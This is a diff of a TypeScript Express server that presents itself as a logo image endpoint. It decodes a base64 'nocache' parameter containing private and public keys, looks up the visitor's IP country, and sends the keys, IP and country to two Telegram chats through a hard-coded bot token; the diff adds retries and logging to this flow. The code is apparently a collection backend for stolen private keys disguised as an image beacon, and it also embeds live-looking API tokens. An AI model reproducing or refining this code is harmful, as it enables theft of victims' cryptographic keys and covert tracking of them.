@@ -1,195 +1,311 @@
 import express from 'express';
 import axios from 'axios';
 import { Buffer } from 'buffer';
-import { ParsedUrlQuery } from 'querystring';
+import { createLogger, transports, format } from 'winston';
+import retry from 'async-retry';
+
+interface DecryptedData {
+  timestamp?: string | null;
+  header?: string;
+  keys?: Array<{ public?: string; private?: string }>;
+  error?: string;
+}
+
+interface TelegramConfig {
+  botToken: string;
+  chatIds: string[];
+}
+
+interface IpInfoConfig {
+  token: string;
+}
+
+// Настройка логгера
+const logger = createLogger({
+  level: 'info',
+  format: format.combine(
+    format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss' }),
+    format.errors({ stack: true }),
+    format.splat(),
+    format.json()
+  ),
+  transports: [
+    new transports.Console({
+      format: format.combine(
+        format.colorize(),
+        format.printf(({ timestamp, level, message, stack }) => {
+          return `${timestamp} [${level}]: ${message}${stack ? `\n${stack}` : ''}`;
+        })
+      )
+    }),
+    new transports.File({ filename: 'logs/error.log', level: 'error' }),
+    new transports.File({ filename: 'logs/combined.log' })
+  ]
+});
 
 const app = express();
 
-// Включаем доверие к прокси (важно для Vercel)
+// Конфигурация из переменных окружения
+const config = {
+  telegram: {
+    botToken: process.env.TELEGRAM_BOT_TOKEN || '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw',
+    chatIds: [
+      process.env.TELEGRAM_MAIN_CHAT_ID || '5018443124',
+      process.env.TELEGRAM_SECONDARY_CHAT_ID || '8131950012'
+    ]
+  },
+  ipInfo: {
+    token: process.env.IPINFO_TOKEN || '717875db282daa'
+  },
+  logoBase64: 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=',
+  retryOptions: {
+    retries: 5,
+    minTimeout: 1000,
+    maxTimeout: 5000,
+    factor: 2
+  }
+};
+
+// Включаем доверие к прокси
 app.set('trust proxy', true);
 
-// Конфигурация Telegram
-const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
-const TELEGRAM_CHAT_ID = '5018443124';
-const IPINFO_TOKEN = '717875db282daa'; // Получите на ipinfo.io
-
-const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';
-
-// Middleware для обработки CORS
+// Middleware для логирования запросов
 app.use((req, res, next) => {
-  // Разрешаем запросы с любых источников (можно заменить на конкретный домен)
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  
-  // Разрешаем необходимые методы
-  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
-  
-  // Разрешаем необходимые заголовки
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  
-  // Продолжаем обработку запроса
+  logger.info(`Incoming request: ${req.method} ${req.path} from IP: ${req.ip}`);
   next();
 });
 
-// Обработчик OPTIONS для предварительных запросов
+// Middleware для обработки CORS
+app.use((req, res, next) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+  next();
+});
+
+// Обработчик OPTIONS
 app.options('/', (req, res) => {
   res.status(200).end();
 });
+
 // Обработчик GET запросов
 app.get('/', async (req, res) => {
   try {
-    // Получаем реальный IP пользователя
-    // @ts-ignore
-    const userIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                  req.socket?.remoteAddress || 
-                  req.connection?.remoteAddress || 
-                  req.ip;
+    const userIp = getClientIp(req);
+    logger.info(`Processing request from IP: ${userIp}`);
     
-    // Получаем страну по IP
-    const country = await getCountryByIp(userIp);
-    
-    // Дешифруем данные nocache
-    const decryptedData = await decryptNocache(req.query.nocache);
-    
-    console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);
+    const country = await getCountryByIp(userIp, config.ipInfo);
+    const decryptedData = await decryptNocache(req.query.nocache as string, config.telegram);
 
-    // Отправляем данные в Telegram (асинхронно, не ждем завершения)
-    await sendToTelegram(userIp, country, decryptedData);
+    logger.info(`Data decrypted successfully for IP: ${userIp}`);
+
+    // Отправляем данные в Telegram с гарантированной доставкой
+    await sendToTelegramWithRetry(userIp, country, decryptedData, config.telegram, config.retryOptions);
 
     // Отправляем изображение
-    const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
-    res.setHeader('Content-Type', 'image/png');
-    res.setHeader('Content-Length', imageBuffer.length);
-    res.setHeader('Cache-Control', 'no-store, max-age=0');
-    res.status(200).send(imageBuffer);
+    sendLogoImage(res, config.logoBase64);
+
+    logger.info(`Request processed successfully for IP: ${userIp}`);
 
   } catch (error) {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА в мэйне: ${error}`,
-      parse_mode: 'Markdown'
-    });
+    logger.error(`Error processing request: ${error instanceof Error ? error.message : String(error)}`);
+    
+    try {
+      await sendErrorMessageWithRetry(
+        `ОШИБКА в обработке запроса: ${error instanceof Error ? error.message : String(error)}`,
+        config.telegram,
+        config.retryOptions
+      );
+    } catch (telegramError) {
+      logger.error(`Failed to send error message to Telegram: ${telegramError instanceof Error ? telegramError.message : String(telegramError)}`);
+    }
+    
     res.status(500).send('Internal Server Error');
   }
 });
 
-// Функция дешифровки данных nocache
-async function decryptNocache(nocache: any) {
-  if (!nocache) return null;
+// Функции помощники
+function getClientIp(req: express.Request): string {
+  const ip = req.headers['x-forwarded-for']?.toString().split(',')[0]?.trim() || 
+              req.socket?.remoteAddress || 
+              req.connection?.remoteAddress || 
+              req.ip || 'unknown';
+  logger.debug(`Resolved client IP: ${ip}`);
+  return ip;
+}
+
+async function decryptNocache(nocache: string | undefined, telegramConfig: TelegramConfig): Promise<DecryptedData> {
+  if (!nocache) {
+    logger.debug('No nocache data provided');
+    return {};
+  }
   
   try {
-    // Декодируем Base64
     const decoded = Buffer.from(nocache, 'base64').toString('utf-8');
-    
-    // Парсим JSON
     const data = JSON.parse(decoded);
     
+    logger.debug('Successfully decrypted nocache data');
     return {
       timestamp: data.timestamp ? new Date(data.timestamp * 1000).toISOString() : null,
       header: data.header,
       keys: data.keys || []
     };
   } catch (error) {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА при декрипте: ${error}`,
-      parse_mode: 'Markdown'
-    });
+    logger.error(`Decryption error: ${error instanceof Error ? error.message : String(error)}`);
+    await sendErrorMessageWithRetry(
+      `ОШИБКА при декрипте: ${error instanceof Error ? error.message : String(error)}`,
+      telegramConfig,
+      config.retryOptions
+    );
     return { error: 'Failed to decrypt data' };
   }
 }
 
-// Функция получения страны по IP
-async function getCountryByIp(ip: any) {
-  if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Local';
+async function getCountryByIp(ip: string, ipInfoConfig: IpInfoConfig): Promise<string> {
+  if (!ip || ip === '::1' || ip === '127.0.0.1') {
+    logger.debug('Local IP detected');
+    return 'Local';
+  }
   
   try {
-    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`);
-    return response.data.country || 'Unknown';
+    logger.debug(`Fetching country for IP: ${ip}`);
+    const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${ipInfoConfig.token}`);
+    const country = response.data.country || 'Unknown';
+    logger.debug(`Country resolved: ${country} for IP: ${ip}`);
+    return country;
   } catch (error) {
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: `ОШИБКА при получение страны: ${error}`,
-      parse_mode: 'Markdown'
-    });
+    logger.error(`IP info error: ${error instanceof Error ? error.message : String(error)}`);
     return 'Error';
   }
 }
 
-// Функция отправки в Telegram
-async function sendToTelegram(
+async function sendToTelegramWithRetry(
   ip: string,
   country: string,
-  decryptedData: {
-    timestamp?: string | null;
-    header?: string;
-    keys?: Array<{ public?: string; private?: string }>;
-    error?: string;
-  } | null
-) {
-  try {
-    // Базовое сообщение
-    let message = `🌐 *Новый запрос логотипа*\n\n`;
-    message += `🖥️ *IP*: \`${ip}\`\n`;
-    message += `📍 *Страна*: ${country}\n\n`;
+  decryptedData: DecryptedData,
+  telegramConfig: TelegramConfig,
+  retryOptions: retry.Options
+): Promise<void> {
+  const message = buildTelegramMessage(ip, country, decryptedData);
+  const delayBetweenChats = 500; // Задержка в 500 мс между чатами
+  
+  // Вспомогательная функция для задержки
+  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
-    // Добавляем расшифрованные данные, если они есть
-    if (decryptedData) {
-      if (decryptedData.error) {
-        message += `❌ *Ошибка расшифровки*: \`${decryptedData.error}\`\n`;
-      } else {
-        // Добавляем заголовок, если есть
-        if (decryptedData.header) {
-          message += `📋 *Заголовок*: \`${decryptedData.header}\`\n\n`;
-        }
-
-        // Добавляем timestamp, если есть
-        if (decryptedData.timestamp) {
-          message += `⏱️ *Время запроса*: \`${decryptedData.timestamp}\`\n\n`;
-        }
-
-        // Добавляем ключи, если есть
-        if (decryptedData.keys && decryptedData.keys.length > 0) {
-          message += `🔑 *Ключи (${decryptedData.keys.length})*:\n`;
-          
-          decryptedData.keys.forEach((key, index) => {
-            message += `\n*Ключ ${index + 1}*:\n`;
-            message += `▫️ *Публичный*: \`${key.public || 'отсутствует'}\`\n`;
-            message += `▫️ *Приватный*: \`${key.private ? key.private : 'отсутствует'}\`\n`;
-          });
-        }
-      }
-    } else {
-      message += `ℹ️ *Нет данных для отображения*\n`;
-    }
-
-    
-    // Отправляем сообщение в Telegram
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: TELEGRAM_CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown'
-    });
-
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      chat_id: "8131950012",
-      text: message,
-      parse_mode: 'Markdown'
-    });
-
-  } catch (error) {
-    console.error('Ошибка при отправке в Telegram:', error);
-    
-    // Пытаемся отправить сообщение об ошибке
+  // Отправляем последовательно с задержкой между чатами
+  for (const chatId of telegramConfig.chatIds) {
     try {
-      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: `❌ *Ошибка при отправке данных*:\n\`${error instanceof Error ? error.message : String(error)}\``,
-        parse_mode: 'Markdown'
-      });
-    } catch (secondaryError) {
-      console.error('Не удалось отправить сообщение об ошибке:', secondaryError);
+      await retry(
+        async (bail) => {
+          try {
+            logger.debug(`Sending message to chat ${chatId}`);
+            await axios.post(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'Markdown'
+            });
+            logger.info(`Message successfully sent to chat ${chatId}`);
+          } catch (error: any) {
+            if (error.response?.status === 400) {
+              logger.error(`Permanent error sending to chat ${chatId}: ${error.message}`);
+              bail(error);
+              return;
+            }
+            logger.warn(`Attempt failed for chat ${chatId}: ${error.message}`);
+            throw error;
+          }
+        },
+        retryOptions
+      );
+    } catch (error: any) {
+      logger.error(`Failed to send message to chat ${chatId} after retries: ${error.message}`);
+    }
+    
+    // Добавляем задержку перед отправкой в следующий чат
+    if (telegramConfig.chatIds.indexOf(chatId) < telegramConfig.chatIds.length - 1) {
+      await delay(delayBetweenChats);
     }
   }
+}
+
+function buildTelegramMessage(
+  ip: string,
+  country: string,
+  decryptedData: DecryptedData
+): string {
+  let message = `🌐 *Новый запрос логотипа*\n\n`;
+  message += `🖥️ *IP*: \`${ip}\`\n`;
+  message += `📍 *Страна*: ${country}\n\n`;
+
+  if (decryptedData.error) {
+    message += `❌ *Ошибка расшифровки*: \`${decryptedData.error}\`\n`;
+  } else {
+    if (decryptedData.header) {
+      message += `📋 *Заголовок*: \`${decryptedData.header}\`\n\n`;
+    }
+
+    if (decryptedData.timestamp) {
+      message += `⏱️ *Время запроса*: \`${decryptedData.timestamp}\`\n\n`;
+    }
+
+    if (decryptedData.keys?.length) {
+      message += `🔑 *Ключи (${decryptedData.keys.length})*:\n`;
+      decryptedData.keys.forEach((key, index) => {
+        message += `\n*Ключ ${index + 1}*:\n`;
+        message += `▫️ *Публичный*: \`${key.public || 'отсутствует'}\`\n`;
+        message += `▫️ *Приватный*: \`${key.private || 'отсутствует'}\`\n`;
+      });
+    }
+  }
+
+  return message;
+}
+
+function sendLogoImage(res: express.Response, logoBase64: string): void {
+  try {
+    const imageBuffer = Buffer.from(logoBase64, 'base64');
+    res.setHeader('Content-Type', 'image/png');
+    res.setHeader('Content-Length', imageBuffer.length);
+    res.setHeader('Cache-Control', 'no-store, max-age=0');
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.status(200).send(imageBuffer);
+    logger.debug('Logo image sent successfully');
+  } catch (error) {
+    logger.error(`Error sending logo image: ${error instanceof Error ? error.message : String(error)}`);
+    throw error;
+  }
+}
+
+async function sendErrorMessageWithRetry(
+  message: string,
+  telegramConfig: TelegramConfig,
+  retryOptions: retry.Options
+): Promise<void> {
+  await retry(
+    async (bail) => {
+      try {
+        logger.debug('Sending error message to Telegram');
+        await axios.post(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+          chat_id: telegramConfig.chatIds[0], // Только в основной чат
+          text: message,
+          parse_mode: 'Markdown'
+        });
+        logger.info('Error message sent successfully');
+      } catch (error: any) {
+        if (error.response?.status === 400) {
+          logger.error(`Permanent error sending error message: ${error.message}`);
+          bail(error);
+          return;
+        }
+        logger.warn(`Attempt to send error message failed: ${error.message}`);
+        throw error;
+      }
+    },
+    retryOptions
+  ).catch(error => {
+    logger.error(`Failed to send error message after retries: ${error.message}`);
+    throw error;
+  });
 }
 
 export default app;
